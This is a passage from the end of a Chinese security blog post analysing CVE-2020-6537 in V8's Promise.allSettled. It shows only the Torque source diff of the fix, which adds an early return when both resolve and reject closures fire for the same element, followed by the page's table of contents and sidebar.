resolve/reject closure</span></span><br><span class="line">+  <span class="comment">// is called on the same index, values.object[index] will already exist and</span></span><br><span class="line">+  <span class="comment">// will not be the hole value. In that case, return early. Everything up to</span></span><br><span class="line">+  <span class="comment">// this point is not yet observable to user code. This is not a problem for</span></span><br><span class="line">+  <span class="comment">// Promise.all since Promise.all has a single resolve closure (no reject) per</span></span><br><span class="line">+  <span class="comment">// element.</span></span><br><span class="line">+  <span class="keyword">if</span> (hasResolveAndRejectClosures) &#123;</span><br><span class="line">+    <span class="keyword">if</span> (values.<span class="property">objects</span>[index] != <span class="title class_">TheHole</span>) deferred &#123;</span><br><span class="line">+        <span class="keyword">return</span> <span class="title class_">Undefined</span>;</span><br><span class="line">+      &#125;</span><br><span class="line">+  &#125;</span><br><span class="line">+</span><br><span class="line">+  <span class="comment">// Update the value depending on whether Promise.all or</span></span><br><span class="line">+  <span class="comment">// Promise.allSettled is called.</span></span><br><span class="line">+  <span class="keyword">const</span> updatedValue = wrapResultFunctor.<span class="title class_">Call</span>(nativeContext, value);</span><br><span class="line">+</span><br><span class="line">   values.<span class="property">objects</span>[index] = updatedValue;</span><br><span class="line"> </span><br><span class="line">   remainingElementsCount = remainingElementsCount - <span class="number">1</span>;</span><br><span class="line">@@ -<span class="number">148</span>,<span class="number">7</span> +<span class="number">166</span>,<span class="number">7</span> @@</span><br><span class="line">     js-implicit <span class="attr">context</span>: <span class="title class_">Context</span>, <span class="attr">receiver</span>: <span class="title class_">JSAny</span>,</span><br><span class="line">     <span class="attr">target</span>: <span class="title class_">JSFunction</span>)(<span class="attr">value</span>: <span class="title class_">JSAny</span>): <span class="title class_">JSAny</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title class_">PromiseAllResolveElementClosure</span>(</span><br><span class="line">-      value, target, <span class="title class_">PromiseAllWrapResultAsFulfilledFunctor</span>&#123;&#125;);</span><br><span class="line">+      value, target, <span class="title class_">PromiseAllWrapResultAsFulfilledFunctor</span>&#123;&#125;, <span class="literal">false</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> transitioning javascript builtin</span><br><span class="line">@@ -<span class="number">156</span>,<span class="number">7</span> +<span class="number">174</span>,<span class="number">7</span> @@</span><br><span class="line">     js-implicit <span class="attr">context</span>: <span class="title class_">Context</span>, <span class="attr">receiver</span>: <span class="title class_">JSAny</span>,</span><br><span class="line">     <span class="attr">target</span>: <span class="title class_">JSFunction</span>)(<span class="attr">value</span>: <span class="title class_">JSAny</span>): <span class="title class_">JSAny</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title class_">PromiseAllResolveElementClosure</span>(</span><br><span class="line">-      value, target, <span class="title class_">PromiseAllSettledWrapResultAsFulfilledFunctor</span>&#123;&#125;);</span><br><span class="line">+      value, target, <span class="title class_">PromiseAllSettledWrapResultAsFulfilledFunctor</span>&#123;&#125;, <span class="literal">true</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> transitioning javascript builtin</span><br><span class="line">@@ -<span class="number">164</span>,<span class="number">6</span> +<span class="number">182</span>,<span class="number">6</span> @@</span><br><span class="line">     js-implicit <span class="attr">context</span>: <span class="title class_">Context</span>, <span class="attr">receiver</span>: <span class="title class_">JSAny</span>,</span><br><span class="line">     <span class="attr">target</span>: <span class="title class_">JSFunction</span>)(<span class="attr">value</span>: <span class="title class_">JSAny</span>): <span class="title class_">JSAny</span> &#123;</span><br><span class="line">   <span class="keyword">return</span> <span class="title class_">PromiseAllResolveElementClosure</span>(</span><br><span class="line">-      value, target, <span class="title class_">PromiseAllSettledWrapResultAsRejectedFunctor</span>&#123;&#125;);</span><br><span class="line">+      value, target, <span class="title class_">PromiseAllSettledWrapResultAsRejectedFunctor</span>&#123;&#125;, <span class="literal">true</span>);</span><br><span class="line"> &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>







</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://c0ke.top">C0KE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://c0ke.top/2025/07/30/CVE-2020-6537%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/">http://c0ke.top/2025/07/30/CVE-2020-6537%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://c0ke.top" target="_blank">Daily Study</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2025/07/30/V8-%E9%80%9A%E7%94%A8%E5%88%A9%E7%94%A8%E9%93%BE/" title="V8-通用利用链"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">V8-通用利用链</div></div></a></div><div class="next-post pull-right"><a href="/2025/07/30/Torque%E5%87%BD%E6%95%B0%E8%A7%A3%E6%9E%90/" title="Torque函数解析"><img class="cover" src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Torque函数解析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/73c31ad1881611ebb6edd017c2d2eca2.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">C0KE</div><div class="author-info__description">C0KE's Study Diary</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">404</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">60</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/C0KE"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/C0KE" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://blog.csdn.net/weixin_62675330?spm=1000.2115.3001.5343" target="_blank" title="CSDN"><i class="fa fa-book-open"></i></a><a class="social-icon" href="mailto:2269279877@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">人人都有选择如何活着的权力</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CVE-2020-6537%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A"><span class="toc-number">1.</span> <span class="toc-text">CVE-2020-6537分析报告</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81%E6%BC%8F%E6%B4%9E%E8%AF%A6%E6%83%85"><span class="toc-number">1.1.</span> <span class="toc-text">一、漏洞详情</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81%E5%BD%B1%E5%93%8D%E8%8C%83%E5%9B%B4"><span class="toc-number">1.2.</span> <span class="toc-text">二、影响范围</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.</span> <span class="toc-text">三、前置知识</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Torque"><span class="toc-number">1.3.1.</span> <span class="toc-text">Torque</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Torque%E5%A6%82%E4%BD%95%E7%94%9F%E6%88%90%E4%BB%A3%E7%A0%81"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">Torque如何生成代码</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#promise"><span class="toc-number">1.3.2.</span> <span class="toc-text">promise</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#promise-allSettled"><span class="toc-number">1.3.3.</span> <span class="toc-text">promise.allSettled</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">1.4.</span> <span class="toc-text">四、漏洞成因</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E4%BB%A3%E7%A0%81%E8%A7%A3%E9%87%8A"><span class="toc-number">1.4.1.</span> <span class="toc-text">漏洞代码解释</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#PromiseAllSettled"><span class="toc-number">1.4.1.1.</span> <span class="toc-text">PromiseAllSettled</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PerformPromiseAll"><span class="toc-number">1.4.1.2.</span> <span class="toc-text">PerformPromiseAll</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#PromiseAllResolveElementClosure"><span class="toc-number">1.4.1.3.</span> <span class="toc-text">PromiseAllResolveElementClosure</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%94%E3%80%81%E7%9B%B8%E5%85%B3%E7%8E%AF%E5%A2%83"><span class="toc-number">1.5.</span> <span class="toc-text">五、相关环境</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%AD%E3%80%81%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.6.</span> <span class="toc-text">六、漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%A7%A3%E9%87%8A"><span class="toc-number">1.6.1.</span> <span class="toc-text">漏洞解释</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FixedArray%E4%B8%8ENumberDictionary%E7%9A%84%E5%86%85%E5%AD%98%E7%BB%93%E6%9E%84%E5%AF%B9%E6%AF%94"><span class="toc-number">1.6.2.</span> <span class="toc-text">FixedArray与NumberDictionary的内存结构对比</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%B1%BB%E5%9E%8B%E6%B7%B7%E6%B7%86"><span class="toc-number">1.6.3.</span> <span class="toc-text">类型混淆</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%99%90%E5%88%B6"><span class="toc-number">1.6.4.</span> <span class="toc-text">限制</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exploitation"><span class="toc-number">1.6.5.</span> <span class="toc-text">Exploitation</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%83%E3%80%81%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%B3%95"><span class="toc-number">1.7.</span> <span class="toc-text">七、修复方法</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/Tenda-FH1201%E5%A4%9A%E5%A4%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/" title="Tenda-FH1201多处命令注入漏洞分析和复现"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Tenda-FH1201多处命令注入漏洞分析和复现"/></a><div class="content"><a class="title" href="/2025/07/30/Tenda-FH1201%E5%A4%9A%E5%A4%84%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E5%92%8C%E5%A4%8D%E7%8E%B0/" title="Tenda-FH1201多处命令注入漏洞分析和复现">Tenda-FH1201多处命令注入漏洞分析和复现</a><time datetime="2025-07-30T03:04:06.916Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/GL-iNet%20%E8%B7%AF%E7%94%B1%E5%99%A8%20CVE-2024-39226%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="GL-iNet 路由器 CVE-2024-39226 漏洞分析"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="GL-iNet 路由器 CVE-2024-39226 漏洞分析"/></a><div class="content"><a class="title" href="/2025/07/30/GL-iNet%20%E8%B7%AF%E7%94%B1%E5%99%A8%20CVE-2024-39226%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="GL-iNet 路由器 CVE-2024-39226 漏洞分析">GL-iNet 路由器 CVE-2024-39226 漏洞分析</a><time datetime="2025-07-30T03:04:06.914Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E5%90%AF%E5%8A%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83/" title="启动路由器环境"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="启动路由器环境"/></a><div class="content"><a class="title" href="/2025/07/30/%E5%90%AF%E5%8A%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E7%8E%AF%E5%A2%83/" title="启动路由器环境">启动路由器环境</a><time datetime="2025-07-30T03:04:06.907Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83+%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" title="修复路由器程序运行环境+远程调试"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="修复路由器程序运行环境+远程调试"/></a><div class="content"><a class="title" href="/2025/07/30/%E4%BF%AE%E5%A4%8D%E8%B7%AF%E7%94%B1%E5%99%A8%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%8E%AF%E5%A2%83+%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95/" title="修复路由器程序运行环境+远程调试">修复路由器程序运行环境+远程调试</a><time datetime="2025-07-30T03:04:06.906Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/07/30/ikuai-3.7.10%E7%89%88%E6%9C%AC%E4%BB%A5%E4%B8%8B%E6%9C%89%E6%8E%88%E6%9D%83%E7%9A%84cmd%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/" title="ikuai-3.7.10版本以下有授权的cmd执行复现"><img src="https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/Sci-Fi%20Energy%20Core.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ikuai-3.7.10版本以下有授权的cmd执行复现"/></a><div class="content"><a class="title" href="/2025/07/30/ikuai-3.7.10%E7%89%88%E6%9C%AC%E4%BB%A5%E4%B8%8B%E6%9C%89%E6%8E%88%E6%9D%83%E7%9A%84cmd%E6%89%A7%E8%A1%8C%E5%A4%8D%E7%8E%B0/" title="ikuai-3.7.10版本以下有授权的cmd执行复现">ikuai-3.7.10版本以下有授权的cmd执行复现</a><time datetime="2025-07-30T03:04:06.904Z" title="发表于 2025-07-30 11:04:06">2025-07-30</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('https://picgo-c0ke.oss-cn-hangzhou.aliyuncs.com/img/sealed%E5%A4%9C%E6%99%9A.png')"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By C0KE</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
POWERMODE.shake = true;
POWERMODE.mobile = false;
document.body.addEventListener('input', POWERMODE);
</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/dist/click-show-text.min.js" data-mobile="false" data-text="C0KE,LOVE,YOU" data-fontsize="15px" data-random="false" async="async"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div></body></html>